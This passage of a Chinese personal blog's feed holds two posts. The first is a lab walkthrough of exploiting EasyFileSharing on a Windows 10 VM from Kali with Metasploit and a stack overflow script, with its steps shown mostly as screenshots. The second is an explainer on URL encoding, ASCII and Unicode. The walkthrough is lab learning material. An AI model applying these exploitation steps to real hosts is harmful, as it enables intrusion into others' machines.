<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600573677088.png" alt="" loading="lazy"></figure>
<p>搜索EasyFileSharing漏洞</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600573690601.png" alt="" loading="lazy"></figure>
<p>设置攻击模块</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600573704435.png" alt="" loading="lazy"></figure>
<p>show payloads后选择第52个</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1600573712860.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1600573771977.png" alt="" loading="lazy"></figure>
<p>在这里可以看到缺少一个RHOSTS和一个LHOST，RHOSTS为靶机IP（win10虚拟机），LHOSTS为攻击者IP（kali）</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1600573785155.png" alt="" loading="lazy"></figure>
<p>查看kali ip地址</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1600573798152.png" alt="" loading="lazy"></figure>
<p>设置ip地址</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1600573806372.png" alt="" loading="lazy"></figure>
<p>此漏洞失败</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1600573816668.png" alt="" loading="lazy"></figure>
<h3 id="尝试栈溢出漏洞">尝试栈溢出漏洞</h3>
<p>首先我们查看easyfilesharing上存在哪些漏洞</p>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1600573827540.png" alt="" loading="lazy"></figure>
<p>我们选取这个进行栈溢出漏洞攻击</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600573834729.png" alt="" loading="lazy"></figure>
<p>利用漏洞脚本</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600573841739.png" alt="" loading="lazy"></figure>
<p>打开了计算器并且关闭了easyfilesharing</p>
<p><img src="https://7usai.github.io/post-images/1600573847447.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600573853001.png" alt="" loading="lazy"></p>
<h3 id="漏洞利用成功">漏洞利用成功</h3>
<p>利用溢出漏洞攻击目标并让其服务崩溃和让主机运行计算器</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[URL,ASCII,Unicode,Base64]]></title>
        <id>https://7usai.github.io/post/BNdT9mz74/</id>
        <link href="https://7usai.github.io/post/BNdT9mz74/">
        </link>
        <updated>2020-09-19T11:13:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="url编码">URL编码</h3>
<p>URI所允许的字符分作<strong>保留</strong>与<strong>未保留</strong>。<strong>保留</strong>字符是那些具有特殊含义的字符，例如：<a href="https://zh.wikipedia.org/wiki/%E6%96%9C%E7%B7%9A">斜线</a>字符用于URL（或URI）不同部分的分界符；<strong>未保留</strong>字符没有这些特殊含义。百分号编码把保留字符表示为特殊字符序列。上述情形随URI与URI的不同版本规格会有轻微的变化。</p>
<h4 id="对保留字符的百分号编码">对保留字符的百分号编码</h4>
<p>首先需要把该字符的ASCII的值表示为两个16进制的数字，然后在其前面放置<a href="https://zh.wikipedia.org/wiki/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">转义字符</a>(&quot;<code>%</code>&quot;)，置入URI中的相应位置。</p>
<h4 id="对未保留字符的百分号编码">对未保留字符的百分号编码</h4>
<p>未保留字符不需要百分号编码.</p>
<h4 id="对百分号字符的百分号编码">对百分号字符的百分号编码</h4>
<p>由于百分号字符(&quot;%&quot;)表示百分号编码字节流的存在, 因此百分号字符应该被编码为3个字节的序列：&quot;%25&quot;，用于URI内部(0x25为%的ascii码)</p>
<p>编码表可以简单的以ASCII码表为准(见下)</p>
<p><a href="https://zh.wikipedia.org/wiki/%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81">URL编码_wiki百科</a></p>
<h2 id="ascii编码">ASCII编码</h2>
<p>ASCII 由电报码发展而来，经过多次更新至今为止共定义了128个字符；其中33个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是陈废的<a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E5%85%83">控制字符</a>。控制字符的用途主要是用来操控已经处理过的文字。<br>
可以简单的分为控制字符和可显示字符</p>
<p>用十进制来表示的话，0<sub>31+127位为控制字符，32</sub>126为可显示字符，其中48～57为0到9十个阿拉伯数字。65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等</p>
<p><a href="https://zh.wikipedia.org/wiki/ASCII">ASCII_wiki百科</a></p>
<h2 id="unicode码">Unicode码</h2>
<p><a href="https://baike.baidu.com/item/Unicode">Unicode</a>是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a>编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。</p>
<p>Unicode码扩展自ASCII<a href="https://baike.baidu.com/item/%E5%AD%97%E5%85%83%E9%9B%86">字元集</a>。Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能用於电脑通讯的字元、象形文字和其他符号。</p>
<p>Unicode最初打算作为ASCII的补充，可能的话，最终将代替它。</p>
<p>Unicode码一直在修正扩充，目前已经包含的文字有：<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">阿拉伯字母</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E7%BE%8E%E5%B0%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">亚美尼亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AD%9F%E5%8A%A0%E6%8B%89%E6%96%87">孟加拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%87%8C%E7%88%BE%E5%AD%97%E6%AF%8D">西里尔字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%A9%E5%9F%8E%E6%96%87">天城文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E9%B2%81%E5%90%89%E4%BA%9A%E5%AD%97%E6%AF%8D">格鲁吉亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E8%87%98%E5%AD%97%E6%AF%8D">希腊字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%90%89%E6%8B%89%E7%89%B9%E6%96%87">古吉拉特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%9C%A8%E5%9F%BA%E6%96%87">古木基文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AB%BA%E6%96%87">谚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E4%BC%AF%E4%BE%86%E5%AD%97%E6%AF%8D">希伯来字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E7%B4%8D%E9%81%94%E6%96%87">卡纳达文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%89%87%E5%81%87%E5%90%8D">片假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AF%AE%E6%96%87%E5%AD%97">寮文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%89%E4%B8%81%E5%AD%97%E6%AF%8D">拉丁字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E6%8B%89%E9%9B%85%E6%8B%89%E5%A7%86%E6%96%87">马拉雅拉姆文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E9%87%8C%E4%BA%9E%E6%96%87">奥里亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E7%B1%B3%E7%88%BE%E6%96%87">泰米尔文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E5%8D%A2%E5%9B%BA%E6%96%87">泰卢固文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E6%96%87%E5%AD%97">泰文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E5%85%83%E7%AC%A6%E8%99%9F">欧元符号</a>、对象替换字符、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%90%89%E8%8C%B2%E5%AD%97%E6%AF%8D">吉兹字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%A3%89%E5%AD%97%E6%AF%8D">高棉字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E5%AD%97%E6%AF%8D">蒙古字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BC%85%E6%96%87">缅文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E7%94%98%E5%AD%97%E6%AF%8D">欧甘字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A2%E6%81%A9%E5%AD%97%E6%AF%8D">卢恩字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%83%A7%E4%BC%BD%E7%BE%85%E6%96%87">僧伽罗文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%95%98%E5%88%A9%E4%BA%9E%E5%AD%97%E6%AF%8D">叙利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%AE%83%E6%8B%BF%E5%AD%97%E6%AF%8D">它拿字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%8B%BF%E5%A4%A7%E5%8E%9F%E4%BD%8F%E6%B0%91%E9%9F%B3%E7%AF%80%E6%96%87%E5%AD%97">加拿大原住民音节文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BD%9D%E6%96%87">彝文</a><br>
、部分盲文图案、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BE%B7%E7%91%9F%E9%9B%B7%E7%89%B9%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">德瑟雷特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%A5%E7%89%B9%E5%AD%97%E6%AF%8D">哥特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%84%8F%E5%A4%A7%E5%88%A9%E5%AD%97%E6%AF%8D">古意大利字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%9F%B3%E6%A8%82%E7%AC%A6%E8%99%9F">音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7">拜占庭音乐符号</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%97%A5%E9%9F%A9%E7%BB%9F%E4%B8%80%E8%A1%A8%E6%84%8F%E6%96%87%E5%AD%97">中日韩统一表意文字</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8F%B2%E5%BE%8B%E5%AE%BE">菲律宾</a>文字<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E9%94%A1%E6%96%87">布锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%8A%AA%E8%AF%BA%E6%96%87&amp;action=edit&amp;redlink=1">哈努诺文</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BB%96%E5%8A%A0%E7%A5%BF%E6%96%87">他加禄文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A1%94%E6%A0%BC%E5%B7%B4%E5%A5%B4%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">塔格巴奴亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A1%9E%E6%B5%A6%E8%B7%AF%E6%96%AF%E9%9F%B3%E8%8A%82%E6%96%87%E5%AD%97">塞浦路斯音节文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9E%97%E5%B8%83%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">林布字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97B">线形文字B</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E6%96%AF%E6%9B%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">奥斯曼亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%95%AD%E4%BC%AF%E7%B4%8D%E5%AD%97%E6%AF%8D">萧伯纳字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BE%B7%E5%AE%8F%E5%82%A3%E6%96%87">德宏傣文</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B9%8C%E5%8A%A0%E9%87%8C%E7%89%B9%E5%AD%97%E6%AF%8D">乌加里特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6">六十四卦</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%83%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">布吉文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E6%8B%89%E5%93%A5%E9%87%8C%E5%AD%97%E6%AF%8D">格拉哥里字母</a>，<a href="https://zh.wikipedia.org/wiki/%E4%BD%89%E5%8D%A2%E6%96%87">佉卢文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%8F%8C%E7%89%88%E7%BA%B3%E5%82%A3%E6%96%87">西双版纳傣文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E6%B3%A2%E6%96%AF%E6%96%87&amp;action=edit&amp;redlink=1">古波斯文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%94%A1%E5%B0%94%E8%B5%AB%E7%89%B9%E6%96%87&amp;action=edit&amp;redlink=1">锡尔赫特文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8F%90%E9%9D%9E%E7%B4%8D%E6%96%87">提非纳文</a> 、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%B8%8C%E8%85%8A%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">古希腊音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%8E%98%E6%96%87">巴厘文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A5%94%E5%BD%A2%E6%96%87%E5%AD%97">楔形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%9D%9E%E4%B9%A6%E9%9D%A2%E6%96%87%E5%AD%97">西非书面文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%85%AB%E6%80%9D%E5%B7%B4%E6%96%87">八思巴文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%85%93%E5%B0%BC%E5%9F%BA%E5%AD%97%E6%AF%8D">腓尼基字母</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%A1%E5%88%A9%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">卡利亚文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A0%E5%A9%86%E5%AD%97%E6%AF%8D">占婆字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%85%8B%E8%80%B6%E9%BB%8E%E6%96%87&amp;action=edit&amp;redlink=1">克耶黎文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BB%92%E5%B7%B4%E6%96%87">绒巴文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%88%A9%E8%A5%BF%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">利西亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%90%95%E5%BA%95%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">吕底亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A1%91%E5%A1%94%E5%88%A9%E6%96%87&amp;action=edit&amp;redlink=1">桑塔利文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%8B%89%E8%AE%A9%E6%96%87&amp;action=edit&amp;redlink=1">拉让文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%B4%A2%E6%8B%89%E4%BB%80%E7%89%B9%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">索拉什特拉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%BD%E4%BB%96%E6%96%87&amp;action=edit&amp;redlink=1">巽他文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E4%BC%8A%E6%96%87&amp;action=edit&amp;redlink=1">瓦伊文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%96%90%E6%96%AF%E6%89%98%E6%96%AF%E5%9C%93%E7%9B%A4">斐斯托斯圆盘</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%BB%E5%B0%86">麻将</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%B1%B3%E8%AF%BA%E9%AA%A8%E7%89%8C">多米诺骨牌</a>上的符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E7%BB%B4%E6%96%AF%E9%99%80%E6%96%87&amp;action=edit&amp;redlink=1">阿维斯陀文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%A7%86%E7%A9%86%E6%96%87%E5%AD%97">巴姆穆文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%8F%8A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97">埃及象形文字</a> （<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%B1%80%E7%B4%8D%E7%AC%A6%E8%99%9F%E8%A1%A8">加汀纳符号表</a>，涵盖1071个符号），<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E6%8B%89%E5%A7%86%E6%96%87">亚拉姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E6%8B%89%E7%BB%B4%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">巴拉维碑铭体</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E6%8F%90%E4%BA%9A%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">帕提亚碑铭体</a>，<a href="https://zh.wikipedia.org/wiki/%E7%88%AA%E5%93%87%E6%96%87">爪哇文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%87%B1%E6%8F%90%E6%96%87">凯提文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%88%E5%83%B3%E6%96%87">老傈僳文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E5%B0%BC%E6%99%AE%E5%B0%94%E6%96%87&amp;action=edit&amp;redlink=1">曼尼普尔文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%97%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">南阿拉伯字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E7%AA%81%E5%8E%A5%E6%96%87">古突厥文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%92%92%E7%8E%9B%E5%88%A9%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">撒玛利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%A3%E6%96%87">老傣文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%82%A3%E9%BB%AF%E8%AA%9E">傣越文</a>。、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E5%A1%94%E5%85%8B%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴塔克字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A9%86%E7%BD%97%E7%B1%B3%E6%96%87%E5%AD%97">婆罗米文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E8%BE%BE%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">曼达字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%B8%E7%89%8C">纸牌</a>符号，<a href="https://zh.wikipedia.org/wiki/%E4%BA%A4%E9%80%9A%E6%A0%87%E5%BF%97">交通标志</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%9B%BE">地图</a>符号，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%82%BC%E9%87%91%E6%9C%AF%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">炼金术符号</a>，<a href="https://zh.wikipedia.org/wiki/%E9%A2%9C%E6%96%87%E5%AD%97">颜文字</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9F%A5%E5%85%8B%E9%A9%AC%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">查克马字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%A6%E7%BD%97%E5%9F%83%E6%96%87">麦罗埃文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BA%A6%E7%BD%97%E5%9F%83%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">麦罗埃象形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9F%8F%E6%A0%BC%E7%90%86%E8%8B%97%E6%96%87">柏格理苗文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A4%8F%E6%8B%89%E9%81%94%E6%96%87">夏拉达文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%8B%89%E5%83%A7%E5%B9%B3%E6%96%87%E5%AD%97">索拉僧平文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B3%B0%E5%85%8B%E9%87%8C%E6%96%87&amp;action=edit&amp;redlink=1">泰克里文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9C%9F%E8%80%B3%E5%85%B6%E9%87%8C%E6%8B%89%E7%AC%A6%E5%8F%B7">土耳其里拉符号</a>、5个双向排版符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E8%90%A8%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴萨字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%AB%98%E5%8A%A0%E7%B4%A2%E9%98%BF%E5%B0%94%E5%B7%B4%E5%B0%BC%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">高加索阿尔巴尼亚字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9D%9C%E6%99%AE%E9%9B%B7%E5%9A%B4%E9%80%9F%E8%A8%98&amp;action=edit&amp;redlink=1">杜普雷严速记</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%88%B1%E5%B0%94%E5%B7%B4%E6%A1%91%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">爱尔巴桑字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%85%B0%E5%A1%94%E6%96%87">古兰塔文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%AF%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">可吉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BA%93%E8%BE%BE%E7%93%A6%E8%BF%AA%E6%96%87&amp;action=edit&amp;redlink=1">库达瓦迪文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97A">线形文字A</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E5%93%88%E4%BD%B3%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">马哈佳尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%BC%E6%95%99%E5%AD%97%E6%AF%8D">摩尼教字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%97%A8%E5%BE%97%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">门得文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%8E%AB%E8%BF%AA%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">莫迪字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BB%98%E6%96%87&amp;action=edit&amp;redlink=1">默文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%8D%E5%B7%B4%E6%B3%B0%E5%AD%97%E6%AF%8D">纳巴泰字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%8C%97%E9%98%BF%E6%8B%89%E4%BC%AF%E6%96%87&amp;action=edit&amp;redlink=1">古北阿拉伯文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%BD%BC%E7%88%BE%E5%A7%86%E6%96%87">古彼尔姆文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9D%A8%E6%9D%BE%E5%BD%95%E8%8B%97%E6%96%87">杨松录苗文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E7%B1%B3%E6%8B%89%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">帕米拉文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%A2%8D%E6%B8%85%E8%B1%AA%E6%96%87&amp;action=edit&amp;redlink=1">袍清豪文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%AF%97%E7%AF%87%E5%B7%B4%E5%88%97%E7%BB%B4%E6%96%87&amp;action=edit&amp;redlink=1">诗篇巴列维文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%82%89%E6%9B%87%E6%96%87%E5%AD%97">悉昙文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BA%95%E7%BD%97%E4%BB%86%E5%A4%9A%E6%96%87">底罗仆多文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E5%85%B0%E9%BD%90%E5%9C%B0%E6%96%87&amp;action=edit&amp;redlink=1">瓦兰齐地文</a>、<a href="https://zh.wikipedia.org/wiki/Dingbat">装饰符号</a>、<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%B4%AA%E5%A7%86%E6%96%87">阿洪姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%AE%89%E7%BA%B3%E6%89%98%E5%88%A9%E4%BA%9A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">安纳托利亚象形文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%9D%A6%E6%96%87&amp;action=edit&amp;redlink=1">哈坦文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%A9%86%E5%B0%94%E5%A1%94%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">穆尔塔尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%8C%88%E7%89%99%E5%88%A9%E5%AD%97%E6%AF%8D">古匈牙利字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E4%B9%A6%E5%86%99%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">书写符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>小写字母，以及五种<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a><a href="https://zh.wikipedia.org/wiki/%E8%86%9A%E8%89%B2">肤色</a>修改字符、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E5%BE%B7%E6%8B%89%E5%A7%86%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">阿德拉姆字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%AF%94%E5%A5%87%E8%88%92%E5%A5%87%E6%96%87&amp;action=edit&amp;redlink=1">比奇舒奇文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%B1%A1%E9%9B%84%E6%96%87">象雄文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B0%BC%E6%B3%8A%E5%B0%94%E7%BA%BD%E7%93%A6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">尼泊尔纽瓦字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%AC%A7%E5%A1%9E%E5%A5%87%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">欧塞奇字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%A4%8F%E6%96%87">西夏文</a>、绘字文、<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E6%96%87%E5%AD%97">札那巴札尔</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%B0%B8%E5%B8%83%E6%96%87%E5%AD%97">索永布文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E8%90%A8%E6%8B%89%E5%A7%86%E8%B4%A1%E5%BE%B7%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">马萨拉姆贡德文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%B3%E4%B9%A6">女书</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AE%8A%E9%AB%94%E5%81%87%E5%90%8D">变体假名</a>（非标准<a 